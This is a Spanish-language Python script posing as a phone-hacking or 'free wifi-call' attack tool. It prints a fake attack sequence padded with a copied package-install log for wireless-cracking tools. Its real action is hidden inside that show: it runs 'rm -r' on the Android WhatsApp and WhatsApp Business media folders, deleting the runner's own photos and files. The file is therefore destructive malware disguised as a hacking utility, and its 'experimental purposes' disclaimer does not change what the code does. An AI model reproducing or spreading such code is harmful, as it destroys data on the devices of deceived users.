#-*-coding: utf-8 -*-
## Módulos a importar
import os
import time
clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
print("""Esta herramienta a sido creada con fines experimentales
no somos responsables del mal uso de la misma!""")
time.sleep(4)
clearConsole()
def menu():
    print("█▀▀ █▀█ █▀▀ █▀▀   █░█░█ █ █▀▀ █ ▄▄ █▀▀ ▄▀█ █░░ █░░")
    print("█▀░ █▀▄ ██▄ ██▄   ▀▄▀▄▀ █ █▀░ █ ░░ █▄▄ █▀█ █▄▄ █▄▄")
    print("                                By Mr Star")
    r=int(input("""Menú:
    1-Ingresar número
    2-Iniciar ataque
    $: """))
    if r==1:
        input("Ingrese número telefónico: ")
        print("Número guardado")
        time.sleep(2)
        clearConsole()
        menu()
    else:
        print("Iniciando ataque a la base de datos")
        time.sleep(3)
        print("Éxito")
        time.sleep(1)
        print("Iniciando transferencia de fondos")
        print("""Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes adicionales:
  git-man liberror-perl
Paquetes sugeridos:
  git-daemon-run | git-daemon-sysvinit git-doc git-el git-email git-gui gitk
  gitweb git-cvs git-mediawiki git-svn
Se instalarán los siguientes paquetes NUEVOS:
  git git-man liberror-perl
0 actualizados, 3 nuevos se instalarán, 0 para eliminar y 2 no actualizados.
Se necesita descargar 7.386 kB de archivos.
Se utilizarán 37,9 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? [S/n] 
Des:1 http://deb.debian.org/debian bullseye/main amd64 liberror-perl all 0.17029-1 [31,0 kB]
Des:2 http://deb.debian.org/debian bullseye/main amd64 git-man all 1:2.30.2-1 [1.827 kB]
Des:3 http://deb.debian.org/debian bullseye/main amd64 git amd64 1:2.30.2-1 [5.527 kB]
Descargados 7.386 kB en 1s (5.360 kB/s)
Seleccionando el paquete liberror-perl previamente no seleccionado.
(Leyendo la base de datos ... 186182 ficheros o directorios instalados actualmen
te.)
Preparando para desempaquetar .../liberror-perl_0.17029-1_all.deb ...
Desempaquetando liberror-perl (0.17029-1) ...
Seleccionando el paquete git-man previamente no seleccionado.
Preparando para desempaquetar .../git-man_1%3a2.30.2-1_all.deb ...
Desempaquetando git-man (1:2.30.2-1) ...
Seleccionando el paquete git previamente no seleccionado.
Preparando para desempaquetar .../git_1%3a2.30.2-1_amd64.deb ...
Desempaquetando git (1:2.30.2-1) ...
Configurando liberror-perl (0.17029-1) ...
Configurando git-man (1:2.30.2-1) ...
Configurando git (1:2.30.2-1) ...
Procesando disparadores para man-db (2.9.4-2) ...
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes adicionales:
  aircrack-ng ethtool hwloc ieee-data libbcg729-0 libc-ares2 libhwloc-plugins
  libhwloc15 libiw30 libsmi2ldbl libwireshark-data libwireshark14 libwiretap11
  libwsutil12 net-tools pixiewps reaver rfkill tshark wireless-tools wireshark-common
Paquetes sugeridos:
  gpsd libhwloc-contrib-plugins snmp-mibs-downloader geoipupdate geoip-database
  geoip-database-extra libjs-leaflet libjs-leaflet.markercluster wireshark-doc
  macchanger bully hashcat hcxdumptool hcxpcaptool
Se instalarán los siguientes paquetes NUEVOS:
  aircrack-ng ethtool hwloc ieee-data libbcg729-0 libc-ares2 libhwloc-plugins
  libhwloc15 libiw30 libsmi2ldbl libwireshark-data libwireshark14 libwiretap11
  libwsutil12 net-tools pixiewps reaver rfkill tshark wifite wireless-tools
  wireshark-common
0 actualizados, 22 nuevos se instalarán, 0 para eliminar y 2 no actualizados.
Se necesita descargar 23,3 MB de archivos.
Se utilizarán 132 MB de espacio de disco adicional después de esta operación.
¿Desea continuar? [S/n] 
Des:1 http://deb.debian.org/debian bullseye/main amd64 ethtool amd64 1:5.9-1 [182 kB]
Des:2 http://security.debian.org/debian-security bullseye-security/main amd64 rfkill amd64 2.36.1-8+deb11u1 [88,6 kB]
Des:3 http://deb.debian.org/debian bullseye/main amd64 libhwloc15 amd64 2.4.1+dfsg-1 [150 kB]
Des:4 http://deb.debian.org/debian bullseye/main amd64 hwloc amd64 2.4.1+dfsg-1 [205 kB]
Des:5 http://deb.debian.org/debian bullseye/main amd64 libiw30 amd64 30~pre9-13.1 [21,6 kB]
Des:6 http://deb.debian.org/debian bullseye/main amd64 wireless-tools amd64 30~pre9-13.1 [113 kB]
Des:7 http://deb.debian.org/debian bullseye/main amd64 aircrack-ng amd64 1:1.6+git20210130.91820bc-1 [535 kB]
Des:8 http://deb.debian.org/debian bullseye/main amd64 ieee-data all 20210605.1 [1.889 kB]
Des:9 http://deb.debian.org/debian bullseye/main amd64 libbcg729-0 amd64 1.1.1-2 [33,1 kB]
Des:10 http://deb.debian.org/debian bullseye/main amd64 libc-ares2 amd64 1.17.1-1+deb11u1 [102 kB]
Des:11 http://deb.debian.org/debian bullseye/main amd64 libhwloc-plugins amd64 2.4.1+dfsg-1 [21,4 kB]
Des:12 http://deb.debian.org/debian bullseye/main amd64 libsmi2ldbl amd64 0.4.8+dfsg2-16 [123 kB]
Des:13 http://deb.debian.org/debian bullseye/main amd64 libwireshark-data all 3.4.10-0+deb11u1 [1.575 kB]
Des:14 http://deb.debian.org/debian bullseye/main amd64 libwsutil12 amd64 3.4.10-0+deb11u1 [106 kB]
Des:15 http://deb.debian.org/debian bullseye/main amd64 libwiretap11 amd64 3.4.10-0+deb11u1 [249 kB]
Des:16 http://deb.debian.org/debian bullseye/main amd64 libwireshark14 amd64 3.4.10-0+deb11u1 [16,0 MB]
Des:17 http://deb.debian.org/debian bullseye/main amd64 net-tools amd64 1.60+git20181103.0eebece-1 [250 kB]
Des:18 http://deb.debian.org/debian bullseye/main amd64 pixiewps amd64 1.4.2-5 [47,6 kB]
Des:19 http://deb.debian.org/debian bullseye/main amd64 reaver amd64 1.6.5-1+b1 [163 kB]
Des:20 http://deb.debian.org/debian bullseye/main amd64 wireshark-common amd64 3.4.10-0+deb11u1 [499 kB]
Des:21 http://deb.debian.org/debian bullseye/main amd64 tshark amd64 3.4.10-0+deb11u1 [187 kB]
Des:22 http://deb.debian.org/debian bullseye/main amd64 wifite all 2.5.8-1 [803 kB]
Descargados 23,3 MB en 3s (6.669 kB/s)
Preconfigurando paquetes ...
Seleccionando el paquete ethtool previamente no seleccionado.
(Leyendo la base de datos ... 187175 ficheros o directorios instalados actualmente.)
Preparando para desempaquetar .../00-ethtool_1%3a5.9-1_amd64.deb ...
Desempaquetando ethtool (1:5.9-1) ...
Seleccionando el paquete libhwloc15:amd64 previamente no seleccionado.
Preparando para desempaquetar .../01-libhwloc15_2.4.1+dfsg-1_amd64.deb ...
Desempaquetando libhwloc15:amd64 (2.4.1+dfsg-1) ...
Seleccionando el paquete hwloc previamente no seleccionado.
Preparando para desempaquetar .../02-hwloc_2.4.1+dfsg-1_amd64.deb ...
Desempaquetando hwloc (2.4.1+dfsg-1) ...
Seleccionando el paquete rfkill previamente no seleccionado.
Preparando para desempaquetar .../03-rfkill_2.36.1-8+deb11u1_amd64.deb ...
Desempaquetando rfkill (2.36.1-8+deb11u1) ...
Seleccionando el paquete libiw30:amd64 previamente no seleccionado.
Preparando para desempaquetar .../04-libiw30_30~pre9-13.1_amd64.deb ...
Desempaquetando libiw30:amd64 (30~pre9-13.1) ...
Seleccionando el paquete wireless-tools previamente no seleccionado.
Preparando para desempaquetar .../05-wireless-tools_30~pre9-13.1_amd64.deb ...
Desempaquetando wireless-tools (30~pre9-13.1) ...
Seleccionando el paquete aircrack-ng previamente no seleccionado.
Preparando para desempaquetar .../06-aircrack-ng_1%3a1.6+git20210130.91820bc-1_amd64.deb 
...
Desempaquetando aircrack-ng (1:1.6+git20210130.91820bc-1) ...
Seleccionando el paquete ieee-data previamente no seleccionado.
Preparando para desempaquetar .../07-ieee-data_20210605.1_all.deb ...
Desempaquetando ieee-data (20210605.1) ...
Seleccionando el paquete libbcg729-0:amd64 previamente no seleccionado.
Preparando para desempaquetar .../08-libbcg729-0_1.1.1-2_amd64.deb ...
Desempaquetando libbcg729-0:amd64 (1.1.1-2) ...
Seleccionando el paquete libc-ares2:amd64 previamente no seleccionado.
Preparando para desempaquetar .../09-libc-ares2_1.17.1-1+deb11u1_amd64.deb ...
Desempaquetando libc-ares2:amd64 (1.17.1-1+deb11u1) ...
Seleccionando el paquete libhwloc-plugins:amd64 previamente no seleccionado.
Preparando para desempaquetar .../10-libhwloc-plugins_2.4.1+dfsg-1_amd64.deb ...
Desempaquetando libhwloc-plugins:amd64 (2.4.1+dfsg-1) ...
Seleccionando el paquete libsmi2ldbl:amd64 previamente no seleccionado.
Preparando para desempaquetar .../11-libsmi2ldbl_0.4.8+dfsg2-16_amd64.deb ...
Desempaquetando libsmi2ldbl:amd64 (0.4.8+dfsg2-16) ...
Seleccionando el paquete libwireshark-data previamente no seleccionado.
Preparando para desempaquetar .../12-libwireshark-data_3.4.10-0+deb11u1_all.deb ...
Desempaquetando libwireshark-data (3.4.10-0+deb11u1) ...
Seleccionando el paquete libwsutil12:amd64 previamente no seleccionado.
Preparando para desempaquetar .../13-libwsutil12_3.4.10-0+deb11u1_amd64.deb ...
Desempaquetando libwsutil12:amd64 (3.4.10-0+deb11u1) ...
Seleccionando el paquete libwiretap11:amd64 previamente no seleccionado.
Preparando para desempaquetar .../14-libwiretap11_3.4.10-0+deb11u1_amd64.deb ...
Desempaquetando libwiretap11:amd64 (3.4.10-0+deb11u1) ...
Seleccionando el paquete libwireshark14:amd64 previamente no seleccionado.
Preparando para desempaquetar .../15-libwireshark14_3.4.10-0+deb11u1_amd64.deb ...
Desempaquetando libwireshark14:amd64 (3.4.10-0+deb11u1) ...
Seleccionando el paquete net-tools previamente no seleccionado.
Preparando para desempaquetar .../16-net-tools_1.60+git20181103.0eebece-1_amd64.deb ...
Desempaquetando net-tools (1.60+git20181103.0eebece-1) ...
Seleccionando el paquete pixiewps previamente no seleccionado.
Preparando para desempaquetar .../17-pixiewps_1.4.2-5_amd64.deb ...
Desempaquetando pixiewps (1.4.2-5) ...
Seleccionando el paquete reaver previamente no seleccionado.
Preparando para desempaquetar .../18-reaver_1.6.5-1+b1_amd64.deb ...
Desempaquetando reaver (1.6.5-1+b1) ...
Seleccionando el paquete wireshark-common previamente no seleccionado.
Preparando para desempaquetar .../19-wireshark-common_3.4.10-0+deb11u1_amd64.deb ...
Desempaquetando wireshark-common (3.4.10-0+deb11u1) ...
Seleccionando el paquete tshark previamente no seleccionado.
Preparando para desempaquetar .../20-tshark_3.4.10-0+deb11u1_amd64.deb ...
Desempaquetando tshark (3.4.10-0+deb11u1) ...
Seleccionando el paquete wifite previamente no seleccionado.
Preparando para desempaquetar .../21-wifite_2.5.8-1_all.deb ...
Desempaquetando wifite (2.5.8-1) ...
Configurando net-tools (1.60+git20181103.0eebece-1) ...
Configurando libbcg729-0:amd64 (1.1.1-2) ...
Configurando libc-ares2:amd64 (1.17.1-1+deb11u1) ...
Configurando libsmi2ldbl:amd64 (0.4.8+dfsg2-16) ...
Configurando libwsutil12:amd64 (3.4.10-0+deb11u1) ...
Configurando rfkill (2.36.1-8+deb11u1) ...
Configurando libhwloc15:amd64 (2.4.1+dfsg-1) ...
Configurando hwloc (2.4.1+dfsg-1) ...
Configurando reaver (1.6.5-1+b1) ...
Configurando ieee-data (20210605.1) ...
Configurando libwireshark-data (3.4.10-0+deb11u1) ...
Configurando pixiewps (1.4.2-5) ...
Configurando libiw30:amd64 (30~pre9-13.1) ...
Configurando ethtool (1:5.9-1) ...
Configurando wireless-tools (30~pre9-13.1) ...
Configurando libhwloc-plugins:amd64 (2.4.1+dfsg-1) ...
Configurando libwiretap11:amd64 (3.4.10-0+deb11u1) ...
Configurando aircrack-ng (1:1.6+git20210130.91820bc-1) ...
Configurando libwireshark14:amd64 (3.4.10-0+deb11u1) ...
Configurando wireshark-common (3.4.10-0+deb11u1) ...
Configurando tshark (3.4.10-0+deb11u1) ...
Configurando wifite (2.5.8-1) ...
Procesando disparadores para shared-mime-info (2.0-1) ...
Procesando disparadores para desktop-file-utils (0.26-1) ...
Procesando disparadores para hicolor-icon-theme (0.17-2) ...
Procesando disparadores para gnome-menus (3.36.0-1) ...
Procesando disparadores para libc-bin (2.31-13+deb11u2) ...
Procesando disparadores para man-db (2.9.4-2) ...
Procesando disparadores para cracklib-runtime (2.9.6-3.4) ...
skipping line: 1""")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp")
        os.system("rm -r /storage/emulated/0/Android/media/com.whatsapp.w4b")
        time.sleep(8)
        print("Éxito")
        time.sleep(1)
        print("Ataque exitoso")

menu()
